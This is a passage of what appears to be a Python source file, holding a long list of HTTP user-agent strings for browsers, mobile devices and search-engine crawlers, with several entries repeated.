               'Mozilla/4.0 (Macintosh; U; Intel Mac OS X 10_6_7; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.205 Safari/534.16',
               'Mozilla/1.22 (X11; U; Linux x86_64; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1',
               'Mozilla/5.0 (compatible; MSIE 2.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.0.30729; InfoPath.2)',
               'Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51',
               'Mozilla/5.0 (compatible; MSIE 2.0; Windows CE; IEMobile 7.0)',
               'Mozilla/4.0 (Macintosh; U; PPC Mac OS X; en-US)',
               'Mozilla/5.0 (Windows; U; Windows NT 6.0; en; rv:1.9.1.7) Gecko/20091221 Firefox/3.5.7',
               'BlackBerry8300/4.2.2 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/107 UP.Link/6.2.3.15.0',
               'Mozilla/1.22 (compatible; MSIE 2.0; Windows 3.1)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; Avant Browser [avantbrowser.com]; iOpus-I-M; QXW03416; .NET CLR 1.1.4322)',
               'Mozilla/3.0 (Windows NT 6.1; ru-ru; rv:1.9.1.3.) Win32; x86 Firefox/3.5.3 (.NET CLR 2.0.50727)',
               'Opera/7.0 (compatible; MSIE 2.0; Windows 3.1)',
               'Opera/9.80 (Windows NT 5.1; U; en-US) Presto/2.8.131 Version/11.10',
               'Mozilla/4.0 (compatible; MSIE 6.0; America Online Browser 1.1; rev1.5; Windows NT 5.1;)',
               'Mozilla/5.0 (Windows; U; Windows CE 4.21; rv:1.8b4) Gecko/20050720 Minimo/0.007',
               'BlackBerry9000/5.0.0.93 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/179',
               'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3',
               'Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 2.0.50727)',
               'Mozilla/5.0 (Windows; U; Windows NT 5.2; de-de; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)',
               'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1 (.NET CLR 3.0.04506.648)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727; .NET4.0C; .NET4.0E',
               'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)',
               'Opera/9.60 (J2ME/MIDP; Opera Mini/4.2.14912/812; U; ru) Presto/2.4.15',
               'Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US) AppleWebKit/125.4 (KHTML, like Gecko, Safari) OmniWeb/v563.57',
               'Mozilla/5.0 (SymbianOS/9.2; U; Series60/3.1 NokiaN95_8GB/31.0.015; Profile/MIDP-2.0 Configuration/CLDC-1.1 ) AppleWebKit/413 (KHTML, like Gecko) Safari/413',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)',
               'Mozilla/5.0 (Windows; U; WinNT4.0; en-US; rv:1.8.0.5) Gecko/20060706 K-Meleon/1.0',
               'Lynx/2.8.6rel.4 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/0.9.8g',
               'Mozilla/4.76 [en] (PalmOS; U; WebPro/3.0.1a; Palm-Arz1)',
               'Mozilla/5.0 (Macintosh; U; PPC Mac OS X; de-de) AppleWebKit/418 (KHTML, like Gecko) Shiira/1.2.2 Safari/125',
               'Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.6) Gecko/2007072300 Iceweasel/2.0.0.6 (Debian-2.0.0.6-0etch1+lenny1)',
               'Mozilla/5.0 (SymbianOS/9.1; U; en-us) AppleWebKit/413 (KHTML, like Gecko) Safari/413',
               'Mozilla/4.0 (compatible; MSIE 6.1; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 3.5.30729; InfoPath.2)',
               'Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)',
               'Links (2.2; GNU/kFreeBSD 6.3-1-486 i686; 80x25)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; WOW64; Trident/4.0; SLCC1)',
               'Mozilla/1.22 (compatible; Konqueror/4.3; Linux) KHTML/4.3.5 (like Gecko)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows CE; IEMobile 6.5)',
               'Opera/9.80 (Macintosh; U; de-de) Presto/2.8.131 Version/11.10',
               'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.9) Gecko/20100318 Mandriva/2.0.4-69.1mib2010.0 SeaMonkey/2.0.4',
               'Mozilla/4.0 (compatible; MSIE 6.1; Windows XP) Gecko/20060706 IEMobile/7.0',
               'Mozilla/5.0 (iPad; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10',
               'Mozilla/5.0 (Macintosh; I; Intel Mac OS X 10_6_7; ru-ru)',
               'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)',
               'Mozilla/1.22 (compatible; MSIE 6.0; Windows NT 6.1; Trident/4.0; GTB6; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; OfficeLiveConnector.1.4; OfficeLivePatch.1.3)',
               'Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)',
               'Mozilla/4.0 (Macintosh; U; Intel Mac OS X 10_6_7; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.205 Safari/534.16',
               'Mozilla/1.22 (X11; U; Linux x86_64; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1',
               'Mozilla/5.0 (compatible; MSIE 2.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.0.30729; InfoPath.2)',
               'Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51',
               'Mozilla/5.0 (compatible; MSIE 2.0; Windows CE; IEMobile 7.0)',
               'Mozilla/4.0 (Macintosh; U; PPC Mac OS X; en-US)',
               'Mozilla/5.0 (Windows; U; Windows NT 6.0; en; rv:1.9.1.7) Gecko/20091221 Firefox/3.5.7',
               'BlackBerry8300/4.2.2 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/107 UP.Link/6.2.3.15.0',
               'Mozilla/1.22 (compatible; MSIE 2.0; Windows 3.1)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; Avant Browser [avantbrowser.com]; iOpus-I-M; QXW03416; .NET CLR 1.1.4322)',
               'Mozilla/3.0 (Windows NT 6.1; ru-ru; rv:1.9.1.3.) Win32; x86 Firefox/3.5.3 (.NET CLR 2.0.50727)',
               'Opera/7.0 (compatible; MSIE 2.0; Windows 3.1)',
               'Opera/9.80 (Windows NT 5.1; U; en-US) Presto/2.8.131 Version/11.10',
               'Mozilla/4.0 (compatible; MSIE 6.0; America Online Browser 1.1; rev1.5; Windows NT 5.1;)',
               'Mozilla/5.0 (Windows; U; Windows CE 4.21; rv:1.8b4) Gecko/20050720 Minimo/0.007',
               'BlackBerry9000/5.0.0.93 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/179',
               'Mozilla/5.0 (compatible; 008/0.83; http://www.80legs.com/webcrawler.html) Gecko/2008032620',
               'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0) AddSugarSpiderBot www.idealobserver.com',
               'Mozilla/5.0 (compatible; AnyApexBot/1.0; +http://www.anyapex.com/bot.html)',
               'Mozilla/4.0 (compatible; Arachmo)', 'Mozilla/4.0 (compatible; B-l-i-t-z-B-O-T)',
               'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)',
               'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)',
               'Mozilla/5.0 (compatible; BecomeBot/2.3; MSIE 6.0 compatible; +http://www.become.com/site_owners.html)',
               'BillyBobBot/1.0 (+http://www.billybobbot.com/crawler/)',
               'Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)',
               'Sqworm/2.9.85-BETA (beta_release; 20011115-775; i686-pc-linux-gnu)',
               'Mozilla/5.0 (compatible; YandexImages/3.0; +http://yandex.com/bots)',
               'Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)',
               'Mozilla/5.0 (compatible; YodaoBot/1.0; http://www.yodao.com/help/webmaster/spider/; )',
               'Mozilla/5.0 (compatible; YodaoBot/1.0; http://www.yodao.com/help/webmaster/spider/; )',
               'Mozilla/4.0 compatible ZyBorg/1.0 Dead Link Checker (wn.zyborg@looksmart.net; http://www.WISEnutbot.com)',
               'Mozilla/4.0 compatible ZyBorg/1.0 Dead Link Checker (wn.dlc@looksmart.net; http://www.WISEnutbot.com)',
               'Mozilla/4.0 compatible ZyBorg/1.0 (wn-16.zyborg@looksmart.net; http://www.WISEnutbot.com)',
               'Mozilla/5.0 (compatible; U; ABrowse 0.6; Syllable) AppleWebKit/420+ (KHTML, like Gecko)',
               'Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; Acoo Browser 1.98.744; .NET CLR 3.5.30729)',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; Acoo Browser; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; Avant Browser)',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; Acoo Browser; GTB6; Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1) ; InfoPath.1; .NET CLR 3.5.30729; .NET CLR 3.0.30618)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; Acoo Browser; .NET CLR 1.1.4322; .NET CLR 2.0.50727)',
               'Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en) AppleWebKit/419 (KHTML, like Gecko, Safari/419.3) Cheshire/1.0.ALPHA',
               'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.2 (KHTML, like Gecko) ChromePlus/4.0.222.3 Chrome/4.0.222.3 Safari/532.2',
               'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.10 (KHTML, like Gecko) Chrome/8.0.552.215 Safari/534.10 ChromePlus/1.5.1.1',
               'Links (2.7; Linux 3.7.9-2-ARCH x86_64; GNU C 4.7.1; text)',
               'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/7046A194A',
               'Mozilla/5.0 (PLAYSTATION 3; 3.55)', 'Mozilla/5.0 (PLAYSTATION 3; 2.00)',
               'Mozilla/5.0 (PLAYSTATION 3; 1.00)',
               'Mozilla/5.0 (Windows NT 6.3; WOW64; rv:24.0) Gecko/20100101 Thunderbird/24.4.0',
               'Mozilla/5.0 (compatible; AbiLogicBot/1.0; +http://www.abilogic.com/bot.html)',
               'SiteBar/3.3.8 (Bookmark Server; http://sitebar.org/)',
               'iTunes/9.0.3 (Macintosh; U; Intel Mac OS X 10_6_2; en-ca)',
               'iTunes/9.0.3 (Macintosh; U; Intel Mac OS X 10_6_2; en-ca)',
               'Mozilla/4.0 (compatible; WebCapture 3.0; Macintosh)',
               'Mozilla/5.0 (Windows; U; Windows NT 5.1; de; rv:1.9.2.3) Gecko/20100401 Firefox/3.6.3 (FM Scene 4.6.1)',
               'Mozilla/5.0 (Windows; U; Windows NT 5.1; de; rv:1.9.2.3) Gecko/20100401 Firefox/3.6.3 (.NET CLR 3.5.30729) (Prevx 3.0.5) ',
               'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.8.1.8) Gecko/20071004 Iceweasel/2.0.0.8 (Debian-2.0.0.6+2.0.0.8-Oetch1)',
               'Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.8.0.1) Gecko/20060111 Firefox/1.5.0.1',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; .NET CLR 1.1.4322)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; {1C69E7AA-C14E-200E-5A77-8EAB2D667A07})',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; acc=baadshah; acc=none; freenet DSL 1.1; (none))',
               'Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; en) Opera 8.51',
               'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.0.1) Gecko/20060111 Firefox/1.5.0.1',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; snprtz|S26320700000083|2600#Service Pack 1#2#5#154321|isdn)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; Alexa Toolbar; mxie; .NET CLR 1.1.4322)',
               'Mozilla/5.0 (Macintosh; U; PPC Mac OS X; ja-jp) AppleWebKit/417.9 (KHTML, like Gecko) Safari/417.8',
               'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3',
               'Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 2.0.50727)',
               'Mozilla/5.0 (Windows; U; Windows NT 5.2; de-de; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)',
               'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1 (.NET CLR 3.0.04506.648)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727; .NET4.0C; .NET4.0E',
               'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)',
               'Opera/9.60 (J2ME/MIDP; Opera Mini/4.2.14912/812; U; ru) Presto/2.4.15',
               'Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US) AppleWebKit/125.4 (KHTML, like Gecko, Safari) OmniWeb/v563.57',
               'Mozilla/5.0 (SymbianOS/9.2; U; Series60/3.1 NokiaN95_8GB/31.0.015; Profile/MIDP-2.0 Configuration/CLDC-1.1 ) AppleWebKit/413 (KHTML, like Gecko) Safari/413',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)',
               'Mozilla/5.0 (Windows; U; WinNT4.0; en-US; rv:1.8.0.5) Gecko/20060706 K-Meleon/1.0',
               'Lynx/2.8.6rel.4 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/0.9.8g',
               'Mozilla/4.76 [en] (PalmOS; U; WebPro/3.0.1a; Palm-Arz1)',
               'Mozilla/5.0 (Macintosh; U; PPC Mac OS X; de-de) AppleWebKit/418 (KHTML, like Gecko) Shiira/1.2.2 Safari/125',
               'Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.6) Gecko/2007072300 Iceweasel/2.0.0.6 (Debian-2.0.0.6-0etch1+lenny1)',
               'Mozilla/5.0 (SymbianOS/9.1; U; en-us) AppleWebKit/413 (KHTML, like Gecko) Safari/413',
               'Mozilla/4.0 (compatible; MSIE 6.1; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 3.5.30729; InfoPath.2)',
               'Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)',
               'Links (2.2; GNU/kFreeBSD 6.3-1-486 i686; 80x25)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; WOW64; Trident/4.0; SLCC1)',
               'Mozilla/1.22 (compatible; Konqueror/4.3; Linux) KHTML/4.3.5 (like Gecko)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows CE; IEMobile 6.5)',
               'Opera/9.80 (Macintosh; U; de-de) Presto/2.8.131 Version/11.10',
               'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.9) Gecko/20100318 Mandriva/2.0.4-69.1mib2010.0 SeaMonkey/2.0.4',
               'Mozilla/4.0 (compatible; MSIE 6.1; Windows XP) Gecko/20060706 IEMobile/7.0',
               'Mozilla/5.0 (iPad; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10',
               'Mozilla/5.0 (Macintosh; I; Intel Mac OS X 10_6_7; ru-ru)',
               'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)',
               'Mozilla/1.22 (compatible; MSIE 6.0; Windows NT 6.1; Trident/4.0; GTB6; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; OfficeLiveConnector.1.4; OfficeLivePatch.1.3)',
               'Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)',
               'Mozilla/4.0 (Macintosh; U; Intel Mac OS X 10_6_7; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.205 Safari/534.16',
               'Mozilla/1.22 (X11; U; Linux x86_64; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1',
               'Mozilla/5.0 (compatible; MSIE 2.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.0.30729; InfoPath.2)',
               'Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51',
               'Mozilla/5.0 (compatible; MSIE 2.0; Windows CE; IEMobile 7.0)',
               'Mozilla/4.0 (Macintosh; U; PPC Mac OS X; en-US)',
               'Mozilla/5.0 (Windows; U; Windows NT 6.0; en; rv:1.9.1.7) Gecko/20091221 Firefox/3.5.7',
               'BlackBerry8300/4.2.2 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/107 UP.Link/6.2.3.15.0',
               'Mozilla/1.22 (compatible; MSIE 2.0; Windows 3.1)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; Avant Browser [avantbrowser.com]; iOpus-I-M; QXW03416; .NET CLR 1.1.4322)',
               'Mozilla/3.0 (Windows NT 6.1; ru-ru; rv:1.9.1.3.) Win32; x86 Firefox/3.5.3 (.NET CLR 2.0.50727)',
               'Opera/7.0 (compatible; MSIE 2.0; Windows 3.1)',
               'Opera/9.80 (Windows NT 5.1; U; en-US) Presto/2.8.131 Version/11.10',
               'Mozilla/4.0 (compatible; MSIE 6.0; America Online Browser 1.1; rev1.5; Windows NT 5.1;)',
               'Mozilla/5.0 (Windows; U; Windows CE 4.21; rv:1.8b4) Gecko/20050720 Minimo/0.007',
               'BlackBerry9000/5.0.0.93 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/179',
               'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; .NET CLR 1.1.4322)',
               'Googlebot/2.1 (http://www.googlebot.com/bot.html)', 'Opera/9.20 (Windows NT 6.0; U; en)',
               'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.1) Gecko/20061205 Iceweasel/2.0.0.1 (Debian-2.0.0.1+dfsg-2)',
               'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; FDM; .NET CLR 2.0.50727; InfoPath.2; .NET CLR 1.1.4322)',
               'Opera/10.00 (X11; Linux i686; U; en) Presto/2.2.0',
               'Mozilla/5.0 (Windows; U; Windows NT 6.0; he-IL) AppleWebKit/528.16 (KHTML, like Gecko) Version/4.0 Safari/528.16',
               'Mozilla/5.0 (compatible; Yahoo! Slurp/3.0; http://help.yahoo.com/help/us/ysearch/slurp)',
               'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.13) Gecko/20101209 Firefox/3.6.13',
               'Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 5.1; Trident/5.0)',
               'Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727)',
               'Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 6.0)', 'Mozilla/4.0 (compatible; MSIE 6.0b; Windows 98)',
               'Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.3) Gecko/20100401 Firefox/4.0 (.NET CLR 3.5.30729)',
               'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.8) Gecko/20100804 Gentoo Firefox/3.6.8',
               'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.7) Gecko/20100809 Fedora/3.6.7-1.fc14 Firefox/3.6.7',
               'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)',
               'Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)',
               'YahooSeeker/1.2 (compatible; Mozilla 4.0; MSIE 5.5; yahooseeker at yahoo-inc dot com ; http://help.yahoo.com/help/us/shop/merchant/)',
               'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3',
               'Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)',
               'Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)',
               'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1',
               'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)',
               'Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)',
               'Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)',
               'Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51',
               'AppEngine-Google; (+http://code.google.com/appengine; appid: webetrex)',
               'Mozilla/5.0 (compatible; MSIE 9.0; AOL 9.7; AOLBuild 4343.19; Windows NT 6.1; WOW64; Trident/5.0; FunWebProducts)',
               'Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.7; AOLBuild 4343.27; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)',
               'Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.7; AOLBuild 4343.21; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C; .NET4.0E)',
               'Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.7; AOLBuild 4343.19; Windows NT 5.1; Trident/4.0; GTB7.2; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)',
               'Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.7; AOLBuild 4343.19; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C; .NET4.0E)',
               'Mozilla/4.0 (compatible; MSIE 7.0; AOL 9.7; AOLBuild 4343.19; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C; .NET4.0E)',
               'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.0.1) Gecko/20060111 Firefox/1.5.0.1',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.1.4322)',
               'Links (2.1pre15; FreeBSD 5.4-STABLE i386; 158x58)', 'Wget/1.8.2',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; en) Opera 8.0', 'Mediapartners-Google/2.1',
               'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.5) Gecko/20031007 Firebird/0.7',
               'Mozilla/4.04 [en] (WinNT; I)',
               'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7.12) Gecko/20060205 Galeon/2.0.0 (Debian package 2.0.0-2)',
               'lwp-trivial/1.41', 'NetBSD-ftp/20031210', 'Dillo/0.8.5-i18n-misc',
               'Links (2.1pre20; NetBSD 2.1_STABLE i386; 145x54)',
               'Lynx/2.8.5rel.5 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/0.9.7d',
               'Lynx/2.8.5rel.3 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/0.9.7d',
               'Links (2.1pre19; NetBSD 2.1_STABLE sparc64; 145x54)',
               'Lynx/2.8.6dev.15 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/0.9.7d',
               'Links (2.1pre14; IRIX64 6.5 IP27; 145x54)', 'Wget/1.10.1',
               'ELinks/0.10.5 (textmode; FreeBSD 4.11-STABLE i386; 80x22-2)',
               'Links (2.1pre20; FreeBSD 4.11-STABLE i386; 80x22)',
               'Lynx/2.8.5rel.4 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/0.9.7d-p1', 'Opera/8.52 (X11; Linux i386; U; de)',
               'Mozilla/5.0 (X11; U; NetBSD i386; en-US; rv:1.8.0.1) Gecko/20060310 Firefox/1.5.0.1',
               'Mozilla/5.0 (X11; U; IRIX64 IP27; en-US; rv:1.4) Gecko/20030711',
               'Mozilla/4.8 [en] (X11; U; IRIX64 6.5 IP27)', 'Mozilla/4.76 [en] (X11; U; SunOS 5.8 sun4m)',
               'Opera/5.0 (SunOS 5.8 sun4m; U) [en]', 'Links (2.1pre15; SunOS 5.8 sun4m; 80x24)',
               'Lynx/2.8.5rel.1 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/0.9.7d', 'Wget/1.8.1', 'Wget/1.9.1',
               'tnftp/20050625', 'Links (1.00pre12; Linux 2.6.14.2.20051115 i686; 80x24) (Debian pkg 0.99+1.00pre12-1)',
               'Lynx/2.8.5rel.1 libwww-FM/2.14 SSL-MM/1.4.1 GNUTLS/1.0.16',
               'Mozilla/5.0 (X11; U; SunOS sun4u; en-US; rv:1.7) Gecko/20051122', 'Wget/1.7',
               'Lynx/2.8.2rel.1 libwww-FM/2.14', 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2; de) Opera 8.53',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2; SV1; .NET CLR 1.1.4322; InfoPath.1; .NET CLR 2.0.50727)',
               'Mozilla/5.0 (Windows; U; Windows NT 5.2; de; rv:1.8.0.1) Gecko/20060111 Firefox/1.5.0.1',
               'Lynx/2.8.5rel.1 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/0.9.7e',
               'Links (2.1pre20; SunOS 5.10 sun4u; 80x22)',
               'Lynx/2.8.5rel.5 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/0.9.7i',
               'Mozilla/5.0 (X11; U; FreeBSD i386; en-US; rv:1.8) Gecko/20060202 Firefox/1.5',
               'Opera/8.51 (X11; Linux i386; U; de)', 'Emacs-W3/4.0pre.46 URL/p4.0pre.46 (i386--freebsd; X11)',
